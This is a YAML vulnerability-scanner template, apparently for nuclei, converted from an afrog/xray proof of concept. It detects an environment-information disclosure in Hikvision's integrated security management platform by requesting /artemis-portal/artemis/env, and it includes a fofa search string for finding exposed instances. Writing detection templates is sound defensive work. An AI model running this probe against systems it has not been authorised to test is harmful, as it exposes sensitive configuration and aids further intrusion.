# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"profiles":'
          - '"server.ports":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/artemis-portal/artemis/env'
id: hikvision-af-env-info-disclosure
info:
  author: peiqi
  description: |-
    HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击
    fofa: app="HIKVISION-综合安防管理平台"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: HiKVISION 综合安防管理平台 env 信息泄漏漏洞
  severity: high
  tags: hikvision,disclosure,argus-import
